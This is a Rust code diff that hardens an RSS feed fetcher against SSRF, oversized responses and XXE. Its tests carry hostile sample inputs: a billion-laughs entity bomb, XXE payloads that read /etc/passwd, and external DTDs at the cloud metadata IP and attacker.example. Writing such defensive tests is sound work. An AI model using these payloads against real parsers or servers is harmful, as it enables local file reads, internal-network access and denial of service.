@@ -22,6 +22,11 @@ use std::collections::HashMap;
 use crate::error::{Result, VaultError};
 use crate::ingest::email::html_to_text;
 use crate::ingest::{DocumentSink, RawDocument, SourceConnector, SourceKind};
+use crate::net::url_guard;
+
+/// 单 feed body 下载上限（16 MiB）。防恶意/失控 feed 撑爆内存（资源耗尽 DoS）。
+/// 真实 RSS/Atom feed 几乎都 < 1 MiB；16 MiB 给极端长 feed 充足余量。
+const MAX_FEED_BYTES: u64 = 16 * 1024 * 1024;
 
 /// 单 feed 的 fetch 输入。worker 从 store 行物化后注入。
 #[derive(Debug, Clone)]
@@ -68,6 +73,12 @@ pub trait FeedFetcher: Send + Sync {
 
 /// 生产 HTTP 抓取层 —— 用 `reqwest` blocking client 走 rustls TLS（纯 Rust，
 /// 与 mail-parser / reqwest_dav 共享 TLS 栈，不引 native-tls/openssl-sys）。
+///
+/// **SSRF 防御**：feed URL 由用户提供，攻击者可诱导后端打内网 / 云 metadata
+/// （`http://169.254.169.254/...`）。抓取前必过 `url_guard::validate_open_outbound_url`
+/// （scheme 仅 http(s) + 解析 IP 拒内网 + 拒裸 IP host）。校验时已解析的公网 IP
+/// 通过 reqwest `.resolve()` 钉死，使实际连接只走该 IP —— libgit2 做不到的
+/// rebinding 缓解（连接阶段不再二次 DNS 查询，杜绝 TOCTOU rebind）。
 pub struct RealFeedFetcher;
 
 impl FeedFetcher for RealFeedFetcher {
@@ -77,12 +88,36 @@ impl FeedFetcher for RealFeedFetcher {
         etag: Option<&str>,
         last_modified: Option<&str>,
     ) -> Result<FeedHttpResponse> {
+        // ① SSRF 校验（无 host allowlist：feed 可在任意公网 host；保留拒内网核心）。
+        //    生产用 system_resolve；返回校验通过的公网 IP 列表。
+        let validated =
+            url_guard::validate_open_outbound_url(url, &|h| url_guard::system_resolve(h))?;
+
         // reqwest blocking client：`SourceConnector::fetch_documents` 是同步契约。
         // 与 WebDavConnector / EmailConnector 不同 —— 它们用 tokio 桥接因为底层
         // async-only；reqwest 既有 blocking 也有 async，blocking 更省一个 runtime。
-        let client = reqwest::blocking::Client::builder()
+        let mut builder = reqwest::blocking::Client::builder()
             .user_agent(concat!("attune/", env!("CARGO_PKG_VERSION"), " (+rss)"))
             .timeout(std::time::Duration::from_secs(30))
+            // ② DNS rebinding 缓解：把已校验的公网 IP 钉死给 host，连接阶段不再
+            //    二次解析（杜绝 TOCTOU rebind 到内网）。端口走 URL scheme 默认。
+            .redirect(reqwest::redirect::Policy::none());
+
+        // 把每个已校验 IP 绑定到 host:port —— reqwest 连接时只用这些 socket。
+        let port =
+            validated
+                .url
+                .port_or_known_default()
+                .unwrap_or(if validated.url.scheme() == "http" {
+                    80
+                } else {
+                    443
+                });
+        for ip in &validated.resolved_ips {
+            builder = builder.resolve(&validated.host, std::net::SocketAddr::new(*ip, port));
+        }
+
+        let client = builder
             .build()
             .map_err(|e| VaultError::LlmUnavailable(format!("rss http client: {e}")))?;
 
@@ -103,6 +138,16 @@ impl FeedFetcher for RealFeedFetcher {
             return Ok(FeedHttpResponse::NotModified);
         }
 
+        // 3xx redirect：自动跟随已禁用（`Policy::none()`）。原因 = 跨 host redirect 会
+        // 触发对新 host 的二次 DNS（绕过已钉死的公网 IP）→ SSRF 重新打开。redirect
+        // 到内网（`http://169.254.169.254`）是经典 SSRF 绕过。明确拒绝，不静默成功。
+        if resp.status().is_redirection() {
+            return Err(VaultError::InvalidInput(format!(
+                "outbound-blocked: feed redirected ({}) — refusing cross-host redirect (SSRF)",
+                resp.status()
+            )));
+        }
+
         if !resp.status().is_success() {
             return Err(VaultError::LlmUnavailable(format!(
                 "rss http {} for {url}",
@@ -121,10 +166,15 @@ impl FeedFetcher for RealFeedFetcher {
             .and_then(|v| v.to_str().ok())
             .map(|s| s.to_string());
 
-        let body = resp
-            .bytes()
-            .map_err(|e| VaultError::LlmUnavailable(format!("rss http body {url}: {e}")))?
-            .to_vec();
+        // 资源耗尽防御：Content-Length 预检 + 流式读取硬上限（拒谎报长度的恶意 server）。
+        if let Some(len) = resp.content_length() {
+            if len > MAX_FEED_BYTES {
+                return Err(VaultError::InvalidInput(format!(
+                    "feed-too-large: {len} bytes exceeds {MAX_FEED_BYTES} cap"
+                )));
+            }
+        }
+        let body = read_capped(resp, MAX_FEED_BYTES, url)?;
 
         Ok(FeedHttpResponse::Ok {
             body,
@@ -132,6 +182,24 @@ impl FeedFetcher for RealFeedFetcher {
             last_modified,
         })
     }
+}
+
+/// 流式读取 HTTP body，超过 `cap` 字节即拒（防 Content-Length 谎报的资源耗尽）。
+fn read_capped(resp: reqwest::blocking::Response, cap: u64, url: &str) -> Result<Vec<u8>> {
+    use std::io::Read;
+    let cap_usize = cap as usize;
+    // 多读 1 字节用于「是否超限」判定：读到 cap+1 即说明 body > cap。
+    let mut buf = Vec::with_capacity(8 * 1024);
+    let mut reader = resp.take(cap + 1);
+    reader
+        .read_to_end(&mut buf)
+        .map_err(|e| VaultError::LlmUnavailable(format!("rss http body {url}: {e}")))?;
+    if buf.len() > cap_usize {
+        return Err(VaultError::InvalidInput(format!(
+            "feed-too-large: body exceeds {cap} byte cap"
+        )));
+    }
+    Ok(buf)
 }
 
 /// 一份 fetch + parse 后的轻量条目（无 entry/feed 的全部 RSS 字段，只保留 ingest 所需）。
@@ -148,11 +216,52 @@ pub struct ParsedRssEntry {
     pub published_at: Option<String>,
 }
 
+/// 拒绝带内部实体定义的 DOCTYPE（XXE / 实体炸弹 fail-fast）。
+///
+/// 只在 XML 序文（root 元素之前）扫描 —— DTD 只能出现在那里。命中
+/// `<!ENTITY` 或外部 DOCTYPE（`SYSTEM` / `PUBLIC` 引用）即拒。大小写不敏感
+/// （XML 关键字大小写敏感，但攻击面保守起见做 ASCII 不区分匹配）。
+fn reject_dtd_entities(bytes: &[u8]) -> Result<()> {
+    // 仅检查前 64 KiB —— DTD 必在文档头部；超大头部本身也是异常。
+    let head_len = bytes.len().min(64 * 1024);
+    let head = String::from_utf8_lossy(&bytes[..head_len]).to_ascii_lowercase();
+    // root 元素之前的部分（首个 '<' 后跟字母/数字的元素起点之前都算序文，
+    // 但简单起见：只要在整个 head 里出现 DTD 标记就拒 —— feed body 里不会合法地
+    // 出现 `<!entity` / `<!doctype`，CDATA 内的尖括号也不会构成这些字面 token）。
+    if head.contains("<!entity") {
+        return Err(VaultError::InvalidInput(
+            "feed-dtd-rejected: XML entity definitions are not allowed (XXE/entity-bomb defense)"
+                .into(),
+        ));
+    }
+    if let Some(pos) = head.find("<!doctype") {
+        // DOCTYPE 本身合法（HTML feed 偶有），但带 SYSTEM/PUBLIC 外部引用或内部
+        // subset（'[' ... ']'）的一律拒 —— 这是实体定义 / 外部 DTD 的载体。
+        let after = &head[pos..];
+        if after.contains("system") || after.contains("public") || after.contains('[') {
+            return Err(VaultError::InvalidInput(
+                "feed-dtd-rejected: DOCTYPE with external/internal DTD subset is not allowed"
+                    .into(),
+            ));
+        }
+    }
+    Ok(())
+}
+
 /// 解析 feed 字节为 `ParsedRssEntry` 列表。纯函数，离线可测。
 ///
 /// feed-rs 2.x 统一 Atom / RSS 1.0 / RSS 2.0 / JSON Feed 到一个 `Feed` 结构，
 /// 此层只取 ingest 必需字段。entry.id 缺失时回退第一个 link.href 作 guid。
 pub fn parse_feed_bytes(bytes: &[u8]) -> Result<Vec<ParsedRssEntry>> {
+    // XXE / 实体炸弹防御（defense-in-depth）。
+    //
+    // feed-rs 底层 quick-xml **不展开实体**（custom entity 解析为空文本，外部
+    // SYSTEM 实体不取文件，外部 DTD 不 fetch）—— 已实测确认 XXE / billion-laughs
+    // 在当前依赖下不可利用。但为防依赖升级后行为漂移、并对带 DTD 的恶意 feed 直接
+    // fail-fast（而非默默吐空文档），这里在解析前显式拒绝**带内部实体定义的
+    // DOCTYPE**（`<!DOCTYPE ... <!ENTITY ...>`）。合法 RSS/Atom feed 从不需要 DTD。
+    reject_dtd_entities(bytes)?;
+
     let feed = feed_rs::parser::parse(bytes)
         .map_err(|e| VaultError::LlmUnavailable(format!("rss parse: {e}")))?;
 
@@ -170,10 +279,7 @@ pub fn parse_feed_bytes(bytes: &[u8]) -> Result<Vec<ParsedRssEntry>> {
             continue;
         };
 
-        let title = entry
-            .title
-            .map(|t| t.content)
-            .unwrap_or_default();
+        let title = entry.title.map(|t| t.content).unwrap_or_default();
 
         // body: <content> 优先 (Atom recommended / RSS 2 content:encoded)；
         // 缺失回退 <summary> (RSS 2 description)。两者都可能含 HTML，统一剥标签。
@@ -188,10 +294,7 @@ pub fn parse_feed_bytes(bytes: &[u8]) -> Result<Vec<ParsedRssEntry>> {
             raw_body
         };
 
-        let published_at = entry
-            .published
-            .or(entry.updated)
-            .map(|d| d.to_rfc3339());
+        let published_at = entry.published.or(entry.updated).map(|d| d.to_rfc3339());
 
         out.push(ParsedRssEntry {
             guid,
@@ -420,6 +523,143 @@ mod tests {
         assert!(result.is_err());
     }
 
+    // ===== XXE / 实体炸弹 / DTD 防御（defense-in-depth）=====
+
+    #[test]
+    fn parse_rejects_billion_laughs_entity_bomb() {
+        // 经典 billion-laughs：嵌套实体引用，展开后指数膨胀。带 <!ENTITY → fail-fast。
+        let bomb = br#"<?xml version="1.0"?>
+<!DOCTYPE rss [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<rss version="2.0"><channel><title>&lol3;</title>
+<item><title>&lol3;</title><guid>x</guid></item></channel></rss>"#;
+        let e = parse_feed_bytes(bomb);
+        assert!(e.is_err(), "billion-laughs must be rejected");
+        assert!(
+            e.unwrap_err().to_string().contains("feed-dtd-rejected"),
+            "must carry feed-dtd-rejected code"
+        );
+    }
+
+    #[test]
+    fn parse_rejects_xxe_external_entity_file_read() {
+        // XXE file:// SYSTEM 实体 —— 经典本地文件读取攻击。<!ENTITY → 拒。
+        let xxe = br#"<?xml version="1.0"?>
+<!DOCTYPE rss [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<rss version="2.0"><channel><title>t</title>
+<item><title>&xxe;</title><guid>x</guid></item></channel></rss>"#;
+        let e = parse_feed_bytes(xxe);
+        assert!(e.is_err(), "XXE file read must be rejected");
+        assert!(e.unwrap_err().to_string().contains("feed-dtd-rejected"));
+    }
+
+    #[test]
+    fn parse_rejects_external_system_dtd_ssrf() {
+        // 外部 SYSTEM DTD —— parser 若 fetch 之即 SSRF（OOB）。DOCTYPE+SYSTEM → 拒。
+        let extdtd = br#"<?xml version="1.0"?>
+<!DOCTYPE rss SYSTEM "http://169.254.169.254/evil.dtd">
+<rss version="2.0"><channel><title>t</title>
+<item><title>x</title><guid>y</guid></item></channel></rss>"#;
+        let e = parse_feed_bytes(extdtd);
+        assert!(e.is_err(), "external SYSTEM DTD must be rejected");
+        assert!(e.unwrap_err().to_string().contains("feed-dtd-rejected"));
+    }
+
+    #[test]
+    fn parse_rejects_external_parameter_entity_dtd() {
+        // 参数实体（% 前缀）外部 DTD —— blind XXE OOB exfil 常用载体。<!ENTITY → 拒。
+        let pe = br#"<?xml version="1.0"?>
+<!DOCTYPE rss [
+  <!ENTITY % ext SYSTEM "http://attacker.example/x.dtd">
+  %ext;
+]>
+<rss version="2.0"><channel><title>t</title><item><title>x</title><guid>y</guid></item></channel></rss>"#;
+        let e = parse_feed_bytes(pe);
+        assert!(e.is_err(), "parameter-entity external DTD must be rejected");
+        assert!(e.unwrap_err().to_string().contains("feed-dtd-rejected"));
+    }
+
+    #[test]
+    fn parse_uppercase_doctype_entity_also_rejected() {
+        // XML 关键字大小写敏感，但我们保守做 ASCII 不区分匹配 —— 大写形式也拒。
+        let upper = br#"<?xml version="1.0"?>
+<!DOCTYPE RSS [ <!ENTITY XXE SYSTEM "file:///etc/hostname"> ]>
+<rss version="2.0"><channel><title>&XXE;</title><item><title>x</title><guid>y</guid></item></channel></rss>"#;
+        assert!(parse_feed_bytes(upper).is_err());
+    }
+
+    #[test]
+    fn parse_clean_feed_with_no_dtd_still_works() {
+        // 防回退：正常 RSS/Atom（无 DTD）必须仍解析成功 —— 拒 DTD 不能误伤合法 feed。
+        assert!(parse_feed_bytes(SIMPLE_RSS2).is_ok());
+        assert_eq!(parse_feed_bytes(SIMPLE_RSS2).unwrap().len(), 2);
+        assert!(parse_feed_bytes(SIMPLE_ATOM).is_ok());
+        assert_eq!(parse_feed_bytes(SIMPLE_ATOM).unwrap().len(), 1);
+    }
+
+    #[test]
+    fn reject_dtd_helper_accepts_doctype_html_without_subset() {
+        // 裸 `<!DOCTYPE html>`（无 SYSTEM/PUBLIC/内部 subset）不应被拒 —— 某些
+        // HTML-ish feed 序文可能带它，且无实体注入面。
+        assert!(reject_dtd_entities(b"<!DOCTYPE html>\n<rss></rss>").is_ok());
+        // 但 PUBLIC（XHTML DTD 引用）含外部引用 → 拒。
+        assert!(reject_dtd_entities(
+            br#"<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://w3.org/x.dtd">"#
+        )
+        .is_err());
+    }
+
+    // ===== RealFeedFetcher SSRF：内网/裸IP/metadata URL 必在网络 I/O 前被拒 =====
+    // 这些 URL 在 SSRF 校验阶段就被拒（无需真实网络），所以离线确定性可测。
+
+    #[test]
+    fn real_fetcher_blocks_metadata_ip() {
+        let f = RealFeedFetcher;
+        let e = f.fetch("http://169.254.169.254/latest/meta-data/", None, None);
+        assert!(e.is_err(), "cloud metadata IP must be blocked");
+        assert!(e.unwrap_err().to_string().contains("outbound-blocked"));
+    }
+
+    #[test]
+    fn real_fetcher_blocks_loopback_and_private_literals() {
+        let f = RealFeedFetcher;
+        for u in [
+            "http://127.0.0.1:8090/feed.xml",
+            "http://[::1]/feed.xml",
+            "http://192.168.0.1/feed.xml",
+            "http://10.0.0.5/feed.xml",
+            "http://172.16.0.1/feed.xml",
+        ] {
+            assert!(
+                f.fetch(u, None, None).is_err(),
+                "must block SSRF target {u}"
+            );
+        }
+    }
+
+    #[test]
+    fn real_fetcher_blocks_non_http_scheme() {
+        let f = RealFeedFetcher;
+        for u in [
+            "file:///etc/passwd",
+            "ftp://feeds.example/x",
+            "gopher://x/y",
+        ] {
+            let e = f.fetch(u, None, None);
+            assert!(e.is_err(), "non-http scheme must be blocked: {u}");
+            assert!(e.unwrap_err().to_string().contains("outbound-blocked"));
+        }
+    }
+
+    #[test]
+    fn max_feed_bytes_is_sane_cap() {
+        // 资源耗尽防御常量回归：16 MiB，远大于真实 feed、远小于撑爆内存的量级。
+        assert_eq!(MAX_FEED_BYTES, 16 * 1024 * 1024);
+    }
+
     /// 离线 mock fetcher：按 url 返回预置响应。
     struct MockFetcher {
         responses: HashMap<String, FeedHttpResponse>,
@@ -471,7 +711,10 @@ mod tests {
         assert_eq!(docs[0].source_kind, SourceKind::Rss);
         assert_eq!(docs[0].title, "First post");
         assert_eq!(docs[0].source_ref, "feed-A#tag:ex.com,2026:1.txt");
-        assert_eq!(docs[0].modified_marker.as_deref(), Some("tag:ex.com,2026:1"));
+        assert_eq!(
+            docs[0].modified_marker.as_deref(),
+            Some("tag:ex.com,2026:1")
+        );
         assert_eq!(docs[0].metadata.get("feed_id").unwrap(), "feed-A");
         assert_eq!(
             docs[0].metadata.get("url").unwrap(),
